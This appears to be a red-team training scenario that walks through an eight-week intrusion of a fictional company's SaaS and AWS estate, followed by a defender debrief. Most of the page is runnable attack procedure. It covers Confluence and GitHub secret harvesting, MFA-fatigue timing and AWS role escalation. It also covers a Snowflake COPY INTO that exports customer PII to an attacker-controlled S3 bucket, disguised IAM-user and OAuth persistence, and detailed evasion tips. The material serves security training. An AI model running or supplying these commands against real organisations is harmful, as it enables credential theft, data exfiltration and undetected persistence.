---
layout: training-page
title: "SaaS-to-IaaS Pivot — The 2024 Breach Pattern — Red Team Academy"
module: "Scenarios"
tags:
  - scenario
  - saas
  - iaas
  - pivot
  - aws
  - okta
  - github
  - service-tokens
  - long-dwell
page_key: "scenarios-saas-pivot-iaas"
render_with_liquid: false
---

# SaaS-to-IaaS Pivot — The 2024 Breach Pattern

## Scenario Overview

This scenario emulates the dominant breach class of 2024 — initial access into a SaaS application (Okta, GitHub, Atlassian, Salesforce, Jira, ServiceNow, Microsoft 365), credential and token harvesting inside that SaaS, then pivot into the customer's IaaS environment (AWS, Azure, GCP) via tokens, secrets, OIDC trust, and cross-tenant relationships that the SaaS holds. The corporate on-prem AD is never touched. The endpoint EDR is never alerted. The crown jewels are in the cloud, the keys to the cloud are in SaaS, and the SaaS is reached by reusing credentials harvested without ever phishing a user at the target.

This is not a tradecraft hypothetical. It is the published shape of the Okta-customer-support breach (Sept-Oct 2023), the Scattered Spider intrusions against MGM Resorts and Caesars (Aug-Sept 2023), Storm-0558 (Microsoft corporate, May-Sept 2023), the Snowflake-customer wave (UNC5537, May-Aug 2024), and the Atlassian / Jira-via-Confluence breaches catalogued by Mandiant in 2024. The pattern repeats because the architectural conditions repeat: SaaS holds the keys; SaaS auth is weaker than on-prem; SaaS audit is paid-tier-only; the IaaS pivot is one OAuth grant or one assumed role away.

Run this scenario across an eight-week simulated campaign. The operator's goal is durable access to the target's primary IaaS environment for data exfiltration and the ability to deploy or alter resources at will — without ever touching a corporate-managed endpoint.

---

## Threat Actor Profile — Composite "TempestBear"

TempestBear is a composite of the operator personas behind the Okta / Scattered Spider / UNC5537 / Storm-0558 activity. The composite captures the shared operational characteristics; specific TTPs are sourced from public reporting.

**Attribution:** Composite of financially-motivated criminal groups (Scattered Spider, UNC5537) and state-aligned ones (Storm-0558, Midnight Blizzard). Compare with `/threat-actors/apt29` for the state-aligned angle and `/threat-actors/blackcat` for the criminal angle.

**Primary motivation:** Data theft for extortion (criminal variant) or strategic SIGINT (state variant). The tradecraft is similar; the exfil destination differs.

**Active since:** 2022 (the Scattered Spider / UNC4419 lineage), 2008+ for the Storm-0558 / APT29-adjacent lineage.

### Known TTPs (composite from public reporting)

| Category | Documented Technique |
|---|---|
| Reconnaissance | LinkedIn employee mapping, vendor identification, third-party support tier identification |
| Resource Development | Infostealer-log purchases (Russian Market, Telegram), AitM phishing infrastructure (Evilginx, EvilGoPhish), purchased Okta admin sessions, helpdesk vishing rehearsal |
| Initial Access | Credential reuse against SaaS, MFA fatigue, helpdesk-vishing for MFA reset, AitM phishing capturing session token, contractor-laptop infostealer log |
| Persistence | OAuth app consent grants with long-lived refresh tokens, SAML token forgery, PAT (personal access token) creation, service-account creation in target SaaS |
| Privilege Escalation | Okta super-admin via helpdesk-reset social, GitHub Enterprise org owner via stolen PAT, OAuth scope expansion |
| Defense Evasion | Operating only in SaaS (no host telemetry), region-matched residential proxy, query shape matched to org-norm BI traffic |
| Credential Access | Browser-stored credentials harvested in SaaS context, secrets scanning of repos visible to compromised user, key vault read via assumed role |
| Discovery | SaaS-only enumeration (Okta apps, GitHub orgs, Salesforce reports), cloud enumeration after pivot |
| Lateral Movement | OAuth scope abuse, OIDC trust assume, federated identity pivot to other SaaS, SaaS-to-IaaS via assumed role |
| Collection | SaaS bulk export (Salesforce bulk API, Snowflake COPY, GitHub repo download), cloud storage staging |
| Command & Control | Cloud-native C2 only (Lambda redirector or Cloudflare Worker beacon receiver), no on-prem agent |
| Exfiltration | Out via attacker-controlled cloud bucket reachable from victim IaaS via assumed role |
| Impact | Extortion (criminal), persistent collection (state) |

### Operational Characteristics

- **No corporate endpoint touched.** Every action originates from a residential proxy in the target's region. No malware on a customer device.
- **SaaS-first reconnaissance.** Once inside Okta or M365, the operator maps every federated SaaS before doing anything visible to the victim.
- **OAuth and refresh tokens are the persistence mechanism.** Password rotation does not evict the operator.
- **Wait state between actions.** Days to weeks between SaaS access and IaaS pivot, to avoid rate-of-action anomalies.
- **Exfil through the target's own cloud.** Data moves to attacker-controlled S3 from victim AWS via assumed role; the egress looks like normal cross-account replication.

---

## Target Profile — "Vertica Holdings"

A fictional mid-market US holding company with three operating subsidiaries. Distinct attack surface from an enterprise targeted in `/scenarios/apt29-financial` (heavily AD-centric); Vertica's gravity is in SaaS.

**Industry:** Holding company with retail, fintech, and logistics subsidiaries.
**Headcount:** ~3,200 across HQ and subsidiary offices, plus ~800 contractors.
**Crown jewels:** Subsidiary M&A deal data in a Confluence space, customer PII in a Snowflake warehouse, source code for the fintech platform in a GitHub Enterprise org, financial close data in NetSuite.

### Technology Stack

| Layer | Technology |
|---|---|
| Identity | Okta Workforce Identity (primary IdP), Microsoft Entra ID (M365 only, federated from Okta) |
| Endpoints | Mixed — Windows 11 corporate-managed via Intune + CrowdStrike Falcon, ~30% BYOD MacBooks for contractors with no MDM |
| Email & docs | M365 E5 — Exchange Online, SharePoint, OneDrive, Teams |
| Code | GitHub Enterprise Cloud — three orgs (`vertica-corp`, `vertica-fintech`, `vertica-retail`) |
| Productivity | Atlassian Cloud — Jira and Confluence, ~1,200 seats |
| CRM | Salesforce, Workday for HR |
| Data warehouse | Snowflake (single account, `vertica-prod`), Databricks for ML workloads |
| Finance | NetSuite for accounting close |
| Cloud | AWS (multiple accounts under one Org), Azure for M365 backend, no GCP |
| Network | Cloudflare Zero Trust for application access; no traditional VPN |
| Monitoring | Splunk SIEM ingesting Okta system log, CrowdStrike telemetry, AWS CloudTrail, GitHub audit log |

### Security Maturity

Vertica is mid-market mature on identity, weaker on SaaS audit, soft on contractor posture.

- Okta MFA enforced for all users; FIDO2 keys for engineering and finance, push for everyone else.
- Conditional access policy in Okta restricts high-risk apps (Snowflake, GitHub) to managed devices — but the policy has a 30-day grandfather window for newly-enrolled devices and a contractor exception path.
- CrowdStrike Falcon on corporate-managed Windows; **no agent on contractor BYOD MacBooks**.
- AWS access via Okta federation to roles; no static IAM users.
- GitHub Enterprise — SAML SSO required, but PATs are allowed for service accounts.
- Snowflake — MFA enforced for interactive users; service accounts use long-lived passwords with no IP allow-list.
- No Defender for Cloud Apps / no Okta Workflows-based UEBA.

This profile is not unusual. It matches a recognisable mid-market posture.

---

## Phase 1 — External Reconnaissance & Credential Acquisition

**ATT&CK Tactics:** Reconnaissance (TA0043), Resource Development (TA0042)

### Objective

Identify the Okta tenant URL, GitHub orgs, AWS accounts (if discoverable), and Atlassian site. Acquire valid credentials from sources outside the target.

### Execution

```
# Okta tenant discovery — most orgs use <company>.okta.com
curl -s -o /dev/null -w "%{http_code}\n" https://vertica.okta.com
# 200 — tenant exists

# Org domain discovery
dig MX vertica.com
# m365 connector domain visible — confirms M365

# GitHub org discovery
# - Search GitHub for "vertica-" prefix
# - Search code globally for "vertica.com" email addresses
# - Check public repos for org membership of known engineers

# Atlassian site
curl -s -o /dev/null -w "%{http_code}\n" https://vertica.atlassian.net
# 200 — exists, tenant URL confirmed

# Snowflake account URL — usually hardest to find outside
# - Check public GitHub for connection strings: "snowflakecomputing.com" + vertica
# - Check Stack Overflow / community posts for tagged questions
# - Check LinkedIn for Snowflake-trained engineers naming the account

# Credential acquisition
# - Infostealer log purchase from Russian Market or Genesis (out of scope ethically and
#   in red team engagements unless customer-side approved)
# - For engagement purposes, customer plants a contractor credential in an
#   infostealer-log-equivalent location, or provides a credential corpus
```

### Output of phase

- Tenant URLs for Okta, M365, Atlassian, GitHub, Salesforce
- Credential corpus including at least one valid Okta auth for a contractor account (FIDO2 not enrolled; push MFA only)
- Mapping of which apps the contractor account has Okta tile access to

---

## Phase 2 — SaaS Initial Access via MFA Fatigue

**ATT&CK Tactics:** Initial Access (TA0001)
**Techniques:** Valid Accounts: Cloud Accounts (T1078.004), MFA Bombing (no T-code yet, often categorized under T1621)

### Execution

The contractor account password was retrieved from a stealer log. The account has push MFA. The operator initiates auth, then sends a steady drip of push notifications over a 90-minute window during the contractor's normal work hours, from an IP geo-located near the contractor's home city. The 12th push is approved.

```
# Push request triggering (conceptual — actual triggering is Okta-side)
# Operator logs into https://vertica.okta.com with stolen creds
# Okta sends push notification to contractor's phone
# Operator waits, retries every ~5min
# Eventually a notification approval lands during a moment of distraction
```

Session token is captured. The Okta session cookie (the `idx` and `sid` cookies, and the JSESSIONID for the IdP) is now bound to the operator's user-agent and IP.

### Operator discipline

- Approval timing matters — early morning, mid-meeting, end of day. Watch the user's calendar via the Okta tile's calendar app preview if available.
- After approval, the operator does **nothing** for two hours. Just dwells. No app launches, no profile changes. This is the most-watched moment in MFA-fatigue compromises and the loudest action is a flurry of immediate logins.

---

## Phase 3 — SaaS Lateral Movement (Okta → Tile Apps)

**ATT&CK Tactics:** Lateral Movement (TA0008), Discovery (TA0007)

### Execution

The contractor's Okta tile has access to:

- M365 (Outlook, OneDrive, Teams, Sharepoint)
- GitHub Enterprise — `vertica-corp` org, read-only on most repos, write on the contractor's project repos
- Atlassian (Jira, Confluence) — full access
- Slack — full member access
- Salesforce — limited record access

The operator does Confluence first. Confluence is a credential goldmine.

```
# Atlassian Confluence search — find credentials, runbooks, on-call docs
# Via the API:

API_TOKEN=<derived from session — operator generates a personal API token at this point>

curl -u "contractor@vertica.com:$API_TOKEN" \
  "https://vertica.atlassian.net/wiki/rest/api/content/search?cql=text~%22password%22"

curl -u "contractor@vertica.com:$API_TOKEN" \
  "https://vertica.atlassian.net/wiki/rest/api/content/search?cql=text~%22aws_access_key%22"

curl -u "contractor@vertica.com:$API_TOKEN" \
  "https://vertica.atlassian.net/wiki/rest/api/content/search?cql=text~%22snowflake%22+AND+text~%22password%22"

# Common finds:
# - AWS access keys in legacy runbook from "before we used Okta federation"
# - Snowflake service account password in a data-engineering wiki
# - GitHub PAT in a deployment-instructions page
# - VPN PSK shared in a network-architecture page
# - Salesforce API token in an integration-config page
```

The operator finds two AWS access keys (one for `vertica-staging` account, one for an old `vertica-archive` account), one Snowflake service-account password (`SNOWFLAKE_ETL` user, full warehouse access), and one GitHub PAT (with `repo:read` scope, valid 90 days).

### Operator discipline

- Don't search for the obvious strings ("password", "secret", "AKIA") all at once — the Atlassian audit log records search queries, and an HR analyst occasionally reviews them. Spread queries across days.
- Confluence has a "Recently viewed" personalized side panel for each user. Don't view 50 pages in 10 minutes — that resets the contractor's personal history visibly. Cap browse rate at the contractor's normal pace.

---

## Phase 4 — GitHub Token Harvest

**ATT&CK Tactics:** Credential Access (TA0006)

### Execution

The GitHub PAT found in Confluence is valid. Operator uses it to enumerate the `vertica-corp` org, `vertica-fintech` org, and `vertica-retail` org via the GraphQL API.

```
GH_TOKEN=<harvested PAT>

# Enumerate org repos (read access)
curl -H "Authorization: bearer $GH_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{organization(login:\"vertica-fintech\"){repositories(first:100){nodes{name,visibility,defaultBranchRef{name}}}}}"}' \
  https://api.github.com/graphql

# Pull GitHub Actions logs (often contains echoed secrets)
gh run list --repo vertica-fintech/api-gateway --limit 50 --json databaseId,name,status,createdAt
gh run view <run-id> --repo vertica-fintech/api-gateway --log

# Secret scanning — TruffleHog against accessible orgs
# (Out of audit scope unless explicitly approved; for engagement, run on
# specific repos the contractor account already has access to)
trufflehog github --token=$GH_TOKEN --org=vertica-fintech --concurrency=4 --no-update

# Personal access token enumeration on the user's behalf
# - The user's PAT scopes determine what's reachable; can't enumerate other users' PATs
# - But organization webhooks, deploy keys, and Actions secrets are reachable
#   if the contractor has org-admin or repo-admin on any repo

# Actions secrets visible (per repo, if repo-admin)
gh secret list --repo vertica-fintech/build-pipeline
```

The trufflehog scan finds two dormant AWS access keys in old commit history (still active), a Snowflake password committed and reverted three months ago, and a Salesforce connected-app client secret in a GitHub Actions workflow log.

### Operator discipline

- GitHub audit log records every API call. Do not log into the GitHub web UI; use the API exclusively, with a user-agent string matching the standard `gh` CLI or `octokit-python`.
- Heavy API usage triggers GitHub's anti-abuse rate limiting at 5000 req/h per token. Stay under 1000/h to avoid rate-limit anomaly events.

---

## Phase 5 — IaaS Pivot (SaaS → AWS)

**ATT&CK Tactics:** Lateral Movement (TA0008), Privilege Escalation (TA0004)

### Execution

The operator now has multiple AWS-key candidates:
- AKIA from Confluence (vertica-staging, vertica-archive)
- AKIA from GitHub commit history (unknown account at first)
- The contractor's Okta-federated AWS access (via `aws sso login`)

The contractor's federated path is the cleanest because it produces normal, expected CloudTrail events. The operator runs `aws sso login` with the contractor's already-authenticated Okta session, gets short-lived credentials, and starts enumerating.

```
# Configure CLI with contractor's SSO profile
aws configure sso
# Enter Okta SSO URL — already authenticated, browser flow completes silently
# Enter default region, profile name

# Caller identity
aws sts get-caller-identity --profile vertica-contractor

# What roles can the contractor assume across accounts?
aws sts assume-role-with-saml ...  # via Okta federation

# Enumerate accessible accounts via Organizations (if contractor has it)
aws organizations list-accounts --profile vertica-contractor 2>/dev/null
# Probably no — contractor permissions limited

# But the contractor's assumed role can call STS get-caller-identity in each
# federated account they have access to. Iterate:
for account in $(cat suspected_accounts.txt); do
  for role in DeveloperReadOnly Developer; do
    aws sts assume-role \
      --role-arn arn:aws:iam::$account:role/$role \
      --role-session-name probe-$account \
      --profile vertica-contractor 2>&1 | head -3
  done
done
```

The contractor has `Developer` role in `vertica-dev` and `DeveloperReadOnly` in `vertica-prod`. The operator pivots to `vertica-dev` first to find further escalation paths.

```
# In vertica-dev as Developer
aws iam list-roles --profile vertica-dev
aws iam list-policies --profile vertica-dev --scope Local

# Find IAM-escalation paths — pmapper
pmapper graph create --profile vertica-dev
pmapper query "preset privesc *" --profile vertica-dev

# pmapper reports: Developer has iam:PassRole on a CodeBuild service role
# that has admin in vertica-prod via assumed-role chain

# Use the CodeBuild path to land admin in vertica-prod
# (Full chain depends on the specific role policies; for this scenario, assume
#  the chain yields prod admin within two assume-role hops.)
```

Now the operator has prod-tier AWS access, achieved entirely via SaaS credentials, no on-prem touch.

### Operator discipline

- CloudTrail in `vertica-prod` is well-monitored, but baseline detection rules are tuned for hosted-service activity, not human-interactive. Stick to read-only AWS API calls for the first week. No `RunInstances`. No `CreateAccessKey`.
- The contractor's normal AWS activity is recorded in CloudTrail; pattern-match it. If the contractor never used `aws s3 ls` against production buckets, doing so on day one is anomalous.
- Use the contractor's normal source-IP (residential proxy in the contractor's region) for all AWS calls. CloudTrail records the source IP.

---

## Phase 6 — Snowflake & Data Plane Collection

**ATT&CK Tactics:** Collection (TA0009)

### Execution

The Snowflake service-account password from Confluence is still valid. `vertica-prod` account, `SNOWFLAKE_ETL` user, no MFA (service account), no IP allow-list. Login produces no anomaly — service accounts log in from many IPs because ETL workers run in multiple AWS regions.

```
snowsql -a vertica-prod -u SNOWFLAKE_ETL -d PROD -w ETL_WH
> SHOW DATABASES;
> SHOW SCHEMAS IN DATABASE PROD;
> SHOW TABLES IN SCHEMA PROD.CUSTOMER;

-- Find tables by row count and recency
SELECT TABLE_NAME, ROW_COUNT, LAST_ALTERED
FROM SNOWFLAKE.ACCOUNT_USAGE.TABLES
WHERE TABLE_SCHEMA = 'CUSTOMER'
ORDER BY ROW_COUNT DESC
LIMIT 20;

-- Stage data to an attacker-controlled S3 bucket
-- (Operator owns AWS account `attacker-collect`; bucket is `attacker-collect-vertica`)
CREATE OR REPLACE STAGE prod_exfil
URL='s3://attacker-collect-vertica/exfil/'
CREDENTIALS = (AWS_KEY_ID='AKIA<attacker-controlled>' AWS_SECRET_KEY='<...>');

COPY INTO @prod_exfil/customers.csv
FROM PROD.CUSTOMER.PROFILES
FILE_FORMAT = (TYPE = CSV)
HEADER = TRUE;
```

The exfil-bucket egress shows in Snowflake's QUERY_HISTORY but looks identical to a normal data engineering staging job. CloudTrail in `vertica-prod` shows no egress because the COPY targets attacker AWS, not Vertica AWS.

### Operator discipline

- Snowflake `COPY INTO` to an attacker-controlled S3 bucket leaves an account ID in the URL or credentials. Use a fresh AWS account for every engagement (it cannot match Vertica's known partners).
- Volume matters. A 50 GB single bulk export triggers Snowflake's cost anomaly alert if Vertica has them enabled. Throttle to small bursts at peak ETL hours.
- Avoid `SELECT *` on tables with `PII` / `CARD` / `SSN` in the name — the QUERY_HISTORY view is searched by some SOCs for exactly that.

---

## Phase 7 — Persistence (SaaS-Native, No Endpoint)

**ATT&CK Tactics:** Persistence (TA0003)

### Execution

The operator now has access. The next step is to ensure password rotation, MFA changes, or contractor offboarding does not lose them.

```
# Create personal access tokens in every SaaS that supports them
# - Atlassian API token under contractor's account (90-day lifetime, no MFA required to mint)
# - GitHub PAT with read scope (cannot avoid the email notification; minimize blast)
# - Salesforce Connected App OAuth refresh token
# - Snowflake legacy password authenticator added under service account (already there)

# Create OAuth app grants on the contractor's M365 account
# Multi-tenant app, registered in attacker-controlled tenant, with Mail.Read,
# Files.Read, and offline_access scopes. Operator phishes the contractor with
# a "you need to authorize this app" lure — accepts.

# In AWS — create a new IAM user in vertica-staging (where contractor has IAM:CreateUser)
aws iam create-user --user-name svc-backup-replica --profile vertica-dev
aws iam create-access-key --user-name svc-backup-replica --profile vertica-dev
# Tag the user to look like a normal service account
aws iam tag-user --user-name svc-backup-replica \
  --tags Key=Purpose,Value=BackupReplication Key=Owner,Value=DataEngineering \
  --profile vertica-dev

# Snowflake — add a network policy that allows attacker proxy IP range as a normal addition
# Subtle. Tag it as if it's a partner integration:
USE ROLE SECURITYADMIN;
CREATE NETWORK POLICY partner_replication_policy
  ALLOWED_IP_LIST = ('203.0.113.0/24', '198.51.100.0/24');
-- Then apply policy to a service user (later — wait a week)
```

The operator has at least four independent persistence paths. Losing one does not lose the engagement.

### Operator discipline

- Persistence creation is the loudest moment of the campaign. Spread it across days, never minutes. Each creation event is one audit log entry. A burst in a 10-minute window is highly detectable.
- Name new resources after plausible business functions. "svc-backup-replica" looks like a DataEng service account; "redteam-persistence-1" obviously does not.
- The OAuth app grant is the highest-value persistence because it survives password rotation, MFA reset, and Okta session expiration. It does **not** survive admin-tier consent revocation, so it is medium-term.

---

## Phase 8 — Exfiltration & Cover

**ATT&CK Tactics:** Exfiltration (TA0010), Defense Evasion (TA0005)

### Execution

The crown jewels — Confluence M&A space, Snowflake customer warehouse, GitHub source for the fintech platform — are exfiltrated incrementally over a four-week window, mixed with cover activity that looks like the contractor's normal work.

```
# Confluence M&A space export (one space at a time, via the legitimate export feature)
# Sized small enough that the audit log entry doesn't stand out
curl -u "contractor@vertica.com:$API_TOKEN" \
  -X POST "https://vertica.atlassian.net/wiki/spaces/MA/export" \
  -H "Content-Type: application/json" \
  -d '{"format":"PDF","subPages":true}'

# Snowflake staged exports (chunked over 4 weeks, mostly during ETL hours)
# Already running — see Phase 6.

# GitHub source code — clone each priority repo once
# Don't clone all 200 repos in a day; pick the ones that matter
git clone https://oauth2:$GH_TOKEN@github.com/vertica-fintech/api-gateway.git
# Mirror locally; commit history included
```

### Cover activity

The operator mimics the contractor's normal work pattern:

- Daily standups attended via Slack message activity (read, react to one or two)
- Ticket updates in Jira (mark one ticket "in progress" weekly)
- Code reviews in GitHub (occasional comment on a PR the contractor would normally see)
- Calendar interactions (accept the meetings the contractor would accept)

This keeps the human-side signal "this user is at work" intact while the data flows.

---

## Defender Debrief

The blue side of this scenario has structural gaps that a corporate-tier SOC routinely misses. The lessons matter even when the engagement is unrelated.

### What Vertica's SOC missed and why

1. **MFA fatigue is signal but rarely correlated.** Okta's system log records every push request. The 11 unanswered pushes before the approval are visible, but no alert ties together "many unanswered pushes" + "approval from a new geo-IP" + "first time this user has approved from this IP." Splunk had the data; no detection rule existed.

2. **Confluence search activity is not monitored.** Atlassian audit (paid tier) records page-search queries, but Vertica is on the free tier. Searches for "password" / "secret" / "aws_access_key" were invisible.

3. **GitHub PAT scope is rarely audited.** A PAT with `repo:read` on three orgs is a high-value capability that survives multiple credential rotations. The org-admin team had no inventory of PATs in active use.

4. **Snowflake service account login from new IP is not anomalous because no baseline exists.** SNOWFLAKE_ETL logs in from many IPs by design; the SOC did not have a "service account login from unusual ASN" rule.

5. **CloudTrail SAML federation has weak baseline.** Contractors federate from many IPs (work-from-anywhere). The contractor's IP for this campaign was residential in the same metro as the contractor's actual home — within baseline.

6. **The OAuth app grant is invisible without Defender for Cloud Apps.** Microsoft surfaces consent grants, but Vertica did not have the licensing.

7. **SaaS-only campaigns produce zero CrowdStrike events.** Falcon never alerted because no Vertica endpoint was involved.

### Controls that would have caught the attack at each phase

| Phase | Control |
|---|---|
| 2 (MFA fatigue) | Okta sign-on policy with **adaptive risk** — block from new geo-IP, require step-up |
| 3 (Confluence search) | Atlassian audit + Splunk rule on `pages.search.password` shape |
| 4 (GitHub PAT) | Org-level PAT policy: SSO-enforced, scope-restricted, max 30-day TTL |
| 5 (CloudTrail federation) | Detection on `AssumeRoleWithSAML` from new IP for users marked as contractor |
| 6 (Snowflake COPY to non-allowlisted S3) | Snowflake network policy restricting external stage URLs |
| 7 (IAM user creation in staging) | CloudTrail rule on `iam:CreateUser` outside approved IaC sources |

### Telemetry the SOC should have had

- Defender for Cloud Apps (DCA) — catches OAuth consent grants and SaaS-to-SaaS anomalies
- Okta Workflows or Okta Identity Threat Protection — adaptive auth + UEBA
- Atlassian Audit Log Streaming (paid feature) — into Splunk
- GitHub Enterprise audit log streaming — into Splunk
- Snowflake Trust Center or Permiso for query-anomaly detection
- AWS GuardDuty + custom rule on `iam:CreateUser` and `iam:CreateAccessKey`

The unifying lesson: in 2024-2026, the cost of *not* enabling SaaS audit telemetry is the entire attack surface invisible to defenders. Vertica had the money — they were on Okta, M365 E5, GitHub Enterprise, and Snowflake Enterprise. They did not have the dedicated SaaS-SecOps engineer. That gap is the engagement's central finding.

---

## Variants

This scenario adapts cleanly to different industries and architectural choices.

- **Healthcare variant:** swap Snowflake for Epic / a clinical data warehouse; swap M&A Confluence for an electronic protected health information (ePHI) document store. The HIPAA tier raises regulatory stakes; the technical pivot is identical.
- **DeFi / crypto variant:** swap Confluence for an internal wiki, GitHub for the protocol team's GitHub Enterprise, and target the deployer key in a cloud-stored KMS. Pivot point becomes the deployment key.
- **State-aligned variant:** the persistence layer leans harder on OAuth grants and SAML token forgery (apt29-style); the exfil target is communications metadata rather than customer PII.

---

## Resources

- CISA, joint cybersecurity advisory on Scattered Spider TTPs (multiple, 2023-2024)
- Mandiant, "UNC5537 Snowflake Targeting Activity" (June 2024)
- Microsoft Threat Intelligence, "Storm-0558 — Mitigation and Investigation" (Sept 2023)
- Okta, "October 2023 Security Incident — Customer Notification"
- Microsoft, "Midnight Blizzard — Mitigation Strategies for Compromise Initial Access" (Jan 2024)
- Krebs on Security, ongoing coverage of Snowflake, MGM, Okta, Caesars breaches
- SpecterOps, "BloodHound for SaaS" research
- Permiso Security, Snowflake-specific behavior research
- Datadog Security Research, SaaS audit logging coverage
- Push Security, "OAuth abuse in 2024" research
